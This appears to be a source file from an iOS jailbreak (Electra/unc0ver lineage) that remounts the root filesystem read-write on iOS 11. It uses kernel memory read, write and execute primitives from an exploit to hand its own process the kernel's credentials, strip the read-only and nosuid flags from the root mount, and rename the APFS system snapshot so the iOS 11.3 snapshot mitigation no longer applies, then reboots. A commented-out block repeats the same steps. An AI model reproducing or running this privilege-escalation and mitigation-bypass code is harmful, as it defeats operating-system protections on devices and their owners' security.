//
//  rootfs_remount.cpp
//  electra1131
//
//  Created by CoolStar on 6/7/18.
//  Copyright Â© 2018 CoolStar. All rights reserved.
//

#include <stdio.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include "rootfs_remountog.h"
#include "utilities/kutils.h"
#include "utilities/KernelMemory.h"
#include "utilities/KernelUtilities.h"
#include "utilities/kutils.h"
#include "../exploit/vouch_4ya/parameters.h"
#include "file_utils.h"
#include "patchfinder64og.h"
#include "kexecute.h"
#include "offsetof.h"
#include "../exploit/common/offsets.h"
#include "../exploit/vouch_4ya/kernel_memory.h"

#include "electra_objc.h"
#include "utils.h"
#include "apfs_util.h"
#include "../headers/jelbrekLib.h"


#include "utilities/kexecute.h"

#include <sys/mman.h>
#include <sys/param.h>


#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>


#define STATUS(msg, btnenbld, tbenbld) do { \
LOG("STATUS: %@", msg); \
dispatch_async(dispatch_get_main_queue(), ^{ \
[UIView performWithoutAnimation:^{ \
[[[JailbreakViewController sharedController] goButton] setEnabled:btnenbld]; \
[[[[JailbreakViewController sharedController] tabBarController] tabBar] setUserInteractionEnabled:tbenbld]; \
[[[JailbreakViewController sharedController] goButton] setTitle:msg forState: btnenbld ? UIControlStateNormal : UIControlStateDisabled]; \
[[[JailbreakViewController sharedController] goButton] layoutIfNeeded]; \
}]; \
}); \
} while (false)

int stage = __COUNTER__;
extern int maxStage;

#define STATUSWITHSTAGE(Stage, MaxStage) STATUS(([NSString stringWithFormat:@"%@ (%d/%d)", NSLocalizedString(@"Exploiting", nil), Stage, MaxStage]), false, false)
#define UPSTAGE() do { \
__COUNTER__; \
stage++; \
STATUSWITHSTAGE(stage, maxStage); \
} while (false)


#define ISADDR(val)            (val != 0 && val != HUGE_VAL && val != -HUGE_VAL)
#define ADDRSTRING(val)        [NSString stringWithFormat:@ADDR, val]


uint64_t _vfs_context() {
    // vfs_context_t vfs_context_current(void)get_vfs_context();
    uint64_t vfs_context = kexecute(GETOFFSET(vfs_context_current), 1, 0, 0, 0, 0, 0, 0);
    //vfs_context = zm_fix_addr(vfs_context);
    return vfs_context;
}

int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(GETOFFSET(vnode_lookup), ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != ERR_SUCCESS) {
        return -1;
    }
    *vpp = MReadKernel64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode){
    return (int)kexecute(GETOFFSET(vnode_put), vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t vnodeForPath(const char *path) {
    uint64_t vfs_context = 0;
    uint64_t *vpp = NULL;
    uint64_t vnode = 0;
    vfs_context = _vfs_context();
    if (!ISADDR(vfs_context)) {
        printf("Failed to get vfs_context.");
        goto out;
    }
    vpp = malloc(sizeof(uint64_t));
    if (vpp == NULL) {
        printf("Failed to allocate memory.");
        goto out;
    }
    if (_vnode_lookup(path, O_RDONLY, vpp, vfs_context) != ERR_SUCCESS) {
        printf("Failed to get vnode at path \"%s\".", path);
        goto out;
    }
    vnode = *vpp;
out:
    if (vpp != NULL) {
        free(vpp);
        vpp = NULL;
    }
    return vnode;
}

uint64_t vnodeForSnapshot(int fd, char *name) {
    uint64_t rvpp_ptr = 0;
    uint64_t sdvpp_ptr = 0;
    uint64_t ndp_buf = 0;
    uint64_t vfs_context = 0;
    uint64_t sdvpp = 0;
    uint64_t sdvpp_v_mount = 0;
    uint64_t sdvpp_v_mount_mnt_data = 0;
    uint64_t snap_meta_ptr = 0;
    uint64_t old_name_ptr = 0;
    uint32_t ndp_old_name_len = 0;
    uint64_t ndp_old_name = 0;
    uint64_t snap_meta = 0;
    uint64_t snap_vnode = 0;
    rvpp_ptr = kmem_alloc(sizeof(uint64_t));
    printf("rvpp_ptr = \n" ADDR, rvpp_ptr);
    if (!ISADDR(rvpp_ptr)) {
        goto out;
    }
    sdvpp_ptr = kmem_alloc(sizeof(uint64_t));
    printf("sdvpp_ptr = \n" ADDR, sdvpp_ptr);
    if (!ISADDR(sdvpp_ptr)) {
        goto out;
    }
    ndp_buf = kmem_alloc(816);
    printf("ndp_buf = \n" ADDR, ndp_buf);
    if (!ISADDR(ndp_buf)) {
        goto out;
    }
    vfs_context =  _vfs_context();
    printf("vfs_context = \n" ADDR, vfs_context);
    if (!ISADDR(vfs_context)) {
        goto out;
    }
    if (kexecute(GETOFFSET(vnode_get_snapshot), fd, rvpp_ptr, sdvpp_ptr, (uint64_t)name, ndp_buf, 2, vfs_context) != ERR_SUCCESS) {
        goto out;
    }
    sdvpp = MReadKernel64(sdvpp_ptr);
    printf("sdvpp = \n" ADDR, sdvpp);
    if (!ISADDR(sdvpp)) {
        goto out;
    }
    sdvpp_v_mount = MReadKernel64(sdvpp + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
    printf("sdvpp_v_mount = \n" ADDR, sdvpp_v_mount);
    if (!ISADDR(sdvpp_v_mount)) {
        goto out;
    }
    sdvpp_v_mount_mnt_data = MReadKernel64(sdvpp_v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_DATA));
    printf("sdvpp_v_mount_mnt_data = \n" ADDR, sdvpp_v_mount_mnt_data);
    if (!ISADDR(sdvpp_v_mount_mnt_data)) {
        goto out;
    }
    snap_meta_ptr = kmem_alloc(sizeof(uint64_t));
    printf("snap_meta_ptr = \n" ADDR, snap_meta_ptr);
    if (!ISADDR(snap_meta_ptr)) {
        goto out;
    }
    old_name_ptr = kmem_alloc(sizeof(uint64_t));
    printf("old_name_ptr = \n" ADDR, old_name_ptr);
    if (!ISADDR(old_name_ptr)) {
        goto out;
    }
    ndp_old_name_len = MReadKernel32(ndp_buf + 336 + 48);
    printf("ndp_old_name_len = 0x%x\n", ndp_old_name_len);
    ndp_old_name = MReadKernel64(ndp_buf + 336 + 40);
    printf("ndp_old_name = \n" ADDR, ndp_old_name);
    if (!ISADDR(ndp_old_name)) {
        goto out;
    }
    if (kexecute(GETOFFSET(fs_lookup_snapshot_metadata_by_name_and_return_name), sdvpp_v_mount_mnt_data, ndp_old_name, ndp_old_name_len, snap_meta_ptr, old_name_ptr, 0, 0) != ERR_SUCCESS) {
        goto out;
    }
    snap_meta = MReadKernel64(snap_meta_ptr);
    printf("snap_meta = \n" ADDR, snap_meta);
    if (!ISADDR(snap_meta)) {
        goto out;
    }
    snap_vnode = kexecute(GETOFFSET(apfs_jhash_getvnode), sdvpp_v_mount_mnt_data, MReadKernel32(sdvpp_v_mount_mnt_data + 440), MReadKernel64(snap_meta + 8), 1, 0, 0, 0);
    snap_vnode = zm_fix_addr(snap_vnode);
    printf("snap_vnode = \n" ADDR, snap_vnode);
    if (!ISADDR(snap_vnode)) {
        goto out;
    }
    
    
    
    
    
out:
    if (ISADDR(sdvpp)) {
        _vnode_put(sdvpp);
    }
    if (ISADDR(sdvpp_ptr)) {
        kmem_free(sdvpp_ptr, sizeof(uint64_t));
    }
    if (ISADDR(ndp_buf)) {
        kmem_free(ndp_buf, 816);
    }
    if (ISADDR(snap_meta_ptr)) {
        kmem_free(snap_meta_ptr, sizeof(uint64_t));
    }
    if (ISADDR(old_name_ptr)) {
        kmem_free(old_name_ptr, sizeof(uint64_t));
    }
    return snap_vnode;
}


















struct hfs_mount_args {
    char    *fspec;            /* block special device to mount */
    uid_t    hfs_uid;        /* uid that owns hfs files (standard HFS only) */
    gid_t    hfs_gid;        /* gid that owns hfs files (standard HFS only) */
    mode_t    hfs_mask;        /* mask to be applied for hfs perms  (standard HFS only) */
    u_int32_t hfs_encoding;    /* encoding for this volume (standard HFS only) */
    struct    timezone hfs_timezone;    /* user time zone info (standard HFS only) */
    int        flags;            /* mounting flags, see below */
    int     journal_tbuffer_size;   /* size in bytes of the journal transaction buffer */
    int        journal_flags;          /* flags to pass to journal_open/create */
    int        journal_disable;        /* don't use journaling (potentially dangerous) */
};

uint64_t offset_vfs_context_current;
uint64_t offset_vnode_lookup;
uint64_t offset_vnode_put;

#define ROOTFSTESTFILE "/.bit_of_fun"
#define ROOTFSMNT "/var/rootfsmnt"


int vnode_put(uint64_t vnode){
    return (int)kexecute(offset_vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

void dumpContentsOfDir(char *path);

int mountDevAsRWAtPath(char *dev, char *path) {
    struct hfs_mount_args mntargs;
    bzero(&mntargs, sizeof(struct hfs_mount_args));
    mntargs.fspec = dev;
    mntargs.hfs_mask = 1;
    gettimeofday(NULL, &mntargs.hfs_timezone);

    int rvtmp = mount("apfs", path, 0, (void *)&mntargs);
    printf("mounting: %d\n", rvtmp);
    return rvtmp;
}

int remountRootAsRW_old(uint64_t slide, uint64_t kern_proc, uint64_t our_proc){
    uint64_t _rootvnode = find_rootvnode();
    uint64_t rootfs_vnode = rk64(_rootvnode);
    uint64_t v_mount = rk64(rootfs_vnode + offsetof_v_mount);
    uint32_t v_flag = rk32(v_mount + offsetof_mnt_flag);
    
    v_flag = v_flag & ~MNT_NOSUID;
    v_flag = v_flag & ~MNT_RDONLY;
    wk32(v_mount + offsetof_mnt_flag, v_flag & ~MNT_ROOTFS);
    
    char *dev_path = strdup("/dev/disk0s1s1");
    int rv = mount("apfs", "/", MNT_UPDATE, (void *)&dev_path);
    printf("remount2: %d\n", rv);
    
    v_mount = rk64(rootfs_vnode + offsetof_v_mount);
    wk32(v_mount + offsetof_mnt_flag, v_flag);
    
    if (file_exists(ROOTFSTESTFILE)){
        printf("Found previous test.. unlinking.\n");
        unlink(ROOTFSTESTFILE);
    }
    
    int fd = open(ROOTFSTESTFILE, O_RDONLY);
    if (fd == -1) {
        fd = creat(ROOTFSTESTFILE, 0644);
    } else {
        printf("File already exists!\n");
    }
    close(fd);
    
    printf("Did we mount / as read+write? %s\n", file_exists(ROOTFSTESTFILE) ? "yes" : "no");
    return 0;
}


int remountRootAsRW(uint64_t slide, uint64_t kern_proc, uint64_t our_proc, int snapshot_success){
    if (/* iOS 11.2.6 or lower don't need snapshot */ kCFCoreFoundationVersionNumber <= 1451.51  || /* we're already remounted properly */ snapshot_success == 0){
        return remountRootAsRW_old(slide, kern_proc, our_proc);
    }
        if (!getOffsets(slide)){
        return -1;
    }
    uint64_t kernucred = rk64(kern_proc+OFFSET(proc, p_ucred));//offsetof_p_ucred);
    uint64_t ourucred = rk64(our_proc+OFFSET(proc, p_ucred));//offsetof_p_ucred);
    char *dev_path = "/dev/disk0s1s1";
    get_vfs_context();
        uint64_t devVnode = getVnodeAtPath(dev_path);
    printf("devVnode 0x%llx\n", devVnode);
    uint64_t specInfo = rk64(devVnode + offsetof_v_specinfo);
    printf("specInfo 0x%llx\n", specInfo);
    wk32(specInfo + offsetof_si_flags, 0); //clear dev vnode's v_specflags
    uint32_t si_flags = MReadKernel32(specInfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
    printf("cleared si_flags = 0x%x\n", si_flags);
   
    
    if (si_flags == 0){
        printf("empty spec info dev vnode's si_flags.\n");

    }
    else{
        vnode_put(devVnode);
        printf("Successfully cleared dev vnode's si_flags.\n");
    }

    if (file_exists(ROOTFSMNT))
        rmdir(ROOTFSMNT);
    
    mkdir(ROOTFSMNT, 0755);
    chown(ROOTFSMNT, 0, 0);
    printf("Temporarily setting kern ucred\n");
    wk64(our_proc+OFFSET(proc, p_ucred), kernucred);
    int rv = -1;
 
    // Mount system snapshot.
    
    if (file_exists("/var/MobileSoftwareUpdate/mnt1")){
        
        printf("delete ota update please first\n");

        
    };
    
    if (is_mountpoint(ROOTFSMNT)) {
        (unmount(ROOTFSMNT, MNT_FORCE));
        
    }

    if (mountDevAsRWAtPath(dev_path, ROOTFSMNT) != ERR_SUCCESS) {
        printf("Error mounting root at %s\n", ROOTFSMNT);
        goto out;
    }
    /* APFS snapshot mitigation bypass bug by CoolStar, exploitation by Pwn20wnd *//* Disables the new APFS snapshot mitigations introduced in iOS 11.3 */
    printf("Disabling the APFS snapshot mitigations\n");
        

    const char *systemSnapshot = find_system_snapshot(ROOTFSMNT);
    const char *newSystemSnapshot = "orig-fs";
    if (!systemSnapshot) {
        goto out;
    }
    
    printf("TRY TO Rename system snapshot...");
    
    int rootfd = open(ROOTFSMNT, O_RDONLY);
    if (rootfd > 0){
        
    }
    
    
    
    
    
    
    
  //  const char **snapshots = snapshot_list(rootfd);
    //const char *origfs = "orig-fs";
    //bool has_origfs = false;
    //const char *thedisk = "/dev/disk0s1s1";
    //run("/sbin/mount");
    printf("Snapshots on newly mounted RootFS:");
    if (systemSnapshot == NULL) {
        close(rootfd);
        
    }
    for (const char *snapshot = systemSnapshot; *snapshot; snapshot++) {
        printf("\t%c", *snapshot);
    }
    free(systemSnapshot);
    
    systemSnapshot = NULL;
    const char *test_snapshot = "test-snapshot";
    (fs_snapshot_create(rootfd, test_snapshot, 0));
    (fs_snapshot_delete(rootfd, test_snapshot, 0));
    
    
    char *systemSnapshotcopy = copySystemSnapshot();
    if (systemSnapshotcopy == NULL){
        goto out;
    }
    uint64_t system_snapshot_vnode = 0;
    uint64_t system_snapshot_vnode_v_data = 0;
    uint32_t system_snapshot_vnode_v_data_flag = 0;
    if (kCFCoreFoundationVersionNumber >= 1535.12) {
        system_snapshot_vnode = vnodeForSnapshot(rootfd, systemSnapshotcopy);//find_rootvnode();//(
        printf("system_snapshot_vnode = \n" ADDR, system_snapshot_vnode);
        ISADDR(system_snapshot_vnode);
        system_snapshot_vnode_v_data = rk64(system_snapshot_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_DATA));
        printf("system_snapshot_vnode_v_data = \n" ADDR, system_snapshot_vnode_v_data);
        ISADDR(system_snapshot_vnode_v_data);
        system_snapshot_vnode_v_data_flag = rk32(system_snapshot_vnode_v_data + 49);
        printf("system_snapshot_vnode_v_data_flag = 0x%x\n", system_snapshot_vnode_v_data_flag);
        wk32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag & ~0x40);
    }
    int rvrename2 = fs_snapshot_rename(rootfd, systemSnapshot, newSystemSnapshot, 0);
    if (kCFCoreFoundationVersionNumber >= 1535.12) {
        wk32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag);
        vnode_put(system_snapshot_vnode);
    }
    free(systemSnapshotcopy);
    systemSnapshotcopy = NULL;
    printf("Successfully renamed system snapshot.\n");
    
    // Reboot.
    close(rootfd);
    
    //int rvrename = do_rename2(root, systemSnapshot, newSystemSnapshot);
    if (rvrename2) {
        goto out;
    }
    rv = 0;
    unmount(ROOTFSMNT, 0);
    rmdir(ROOTFSMNT);
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
out:
    printf("Restoring our ucred\n");
    wk64(our_proc+OFFSET(proc, p_ucred), ourucred);
    vnode_put(devVnode);//cleanup
    
    if (!rv) {
        printf("Disabled the APFS snapshot mitigations\n");printf("Restarting\n");
        restarting();sleep(2);do_restart();
    } else {
        printf("Failed to disable the APFS snapshot mitigations\n");
    }
    return -1;
}


/*
 // Remount RootFS.
 
 printf("Remounting RootFS...");
 printf("Failed to remount RootFS.");
 int rootfd22 = open("/", O_RDONLY);
 _assert(rootfd22 > 0, message, true);
 const char **snapshots = snapshot_list(rootfd);
 const char *origfs = "orig-fs";
 bool has_origfs = false;
 const char *thedisk = "/dev/disk0s1s1";
 _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
 if (snapshots == NULL) {
 close(rootfd22);
 
 
 // Mount system snapshot.
 

 // Rename system snapshot.
 
 printf("Renaming system snapshot...");
 SETMESSAGE(NSLocalizedString(@"Unable to rename system snapshot. Delete OTA file from Settings - Storage if present and reboot.", nil));
 rootfd = open(systemSnapshotMountPoint, O_RDONLY);
 _assert(rootfd > 0, message, true);
 snapshots = snapshot_list(rootfd);
 _assert(snapshots != NULL, message, true);
 printf("Snapshots on newly mounted RootFS:");
 for (const char **snapshot = snapshots; *snapshot; snapshot++) {
 printf("\t%s", *snapshot);
 }
 free(snapshots);
 
 snapshots = NULL;
 const char *test_snapshot = "test-snapshot";
 _assert(fs_snapshot_create(rootfd, test_snapshot, 0) == ERR_SUCCESS, message, true);
 _assert(fs_snapshot_delete(rootfd, test_snapshot, 0) == ERR_SUCCESS, message, true);
 char *systemSnapshot = copySystemSnapshot();
 _assert(systemSnapshot != NULL, message, true);
 uint64_t system_snapshot_vnode = 0;
 uint64_t system_snapshot_vnode_v_data = 0;
 uint32_t system_snapshot_vnode_v_data_flag = 0;
 if (kCFCoreFoundationVersionNumber >= 1535.12) {
 system_snapshot_vnode = vnodeForSnapshot(rootfd, systemSnapshot);
 printf("system_snapshot_vnode = " ADDR, system_snapshot_vnode);
 _assert(ISADDR(system_snapshot_vnode), message, true);
 system_snapshot_vnode_v_data = ReadKernel64(system_snapshot_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_DATA));
 printf("system_snapshot_vnode_v_data = " ADDR, system_snapshot_vnode_v_data);
 _assert(ISADDR(system_snapshot_vnode_v_data), message, true);
 system_snapshot_vnode_v_data_flag = ReadKernel32(system_snapshot_vnode_v_data + 49);
 printf("system_snapshot_vnode_v_data_flag = 0x%x", system_snapshot_vnode_v_data_flag);
 WriteKernel32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag & ~0x40);
 }
 _assert(fs_snapshot_rename(rootfd, systemSnapshot, origfs, 0) == ERR_SUCCESS, message, true);
 if (kCFCoreFoundationVersionNumber >= 1535.12) {
 WriteKernel32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag);
 _assert(_vnode_put(system_snapshot_vnode) == ERR_SUCCESS, message, true);
 }
 free(systemSnapshot);
 systemSnapshot = NULL;
 printf("Successfully renamed system snapshot.");
 
 // Reboot.
 close(rootfd);
 
 printf("Rebooting...");
 SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
 NOTICE(NSLocalizedString(@"The system snapshot has been successfully renamed. The device will now be restarted.", nil), true, false);
 _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
 printf("Successfully rebooted.");
 } else {
 printf("APFS Snapshots:");
 for (const char **snapshot = snapshots; *snapshot; snapshot++) {
 if (strcmp(origfs, *snapshot) == 0) {
 has_origfs = true;
 }
 printf("%s", *snapshot);
 }
 }
 
 _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
 uint64_t rootfs_vnode = vnodeForPath("/");
 printf("rootfs_vnode = " ADDR, rootfs_vnode);
 _assert(ISADDR(rootfs_vnode), message, true);
 uint64_t v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
 printf("v_mount = " ADDR, v_mount);
 _assert(ISADDR(v_mount), message, true);
 uint32_t v_flag = ReadKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG));
 if ((v_flag & (MNT_RDONLY | MNT_NOSUID))) {
 v_flag = v_flag & ~(MNT_RDONLY | MNT_NOSUID);
 WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag & ~MNT_ROOTFS);
 _assert(runCommand("/sbin/mount", "-u", thedisk, NULL) == ERR_SUCCESS, message, true);
 WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
 }
 _assert(_vnode_put(rootfs_vnode) == ERR_SUCCESS, message, true);
 _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
 NSString *file = [NSString stringWithContentsOfFile:@"/.installed_unc0ver" encoding:NSUTF8StringEncoding error:nil];
 needStrap = (file == nil ||
 (![file isEqualToString:@""] &&
 ![file isEqualToString:[NSString stringWithFormat:@"%f\n", kCFCoreFoundationVersionNumber]]))
 && access("/electra", F_OK) != ERR_SUCCESS;
 if (needStrap)
 printf("We need strap.");
 if (snapshots != NULL && needStrap && !has_origfs) {
 // Create system snapshot.
 
 printf("Creating system snapshot...");
 SETMESSAGE(NSLocalizedString(@"Unable to create system snapshot.  Delete OTA file from Settings - Storage if present", nil));
 _assert(fs_snapshot_create(rootfd, origfs, 0) == ERR_SUCCESS, message, true);
 _assert(snapshot_check(rootfd, origfs), message, true);
 printf("Successfully created system snapshot.");
 }
 close(rootfd);
 printf("Successfully remounted RootFS.");
 INSERTSTATUS(NSLocalizedString(@"Remounted RootFS.\n", nil));
 
 
 
 
 */














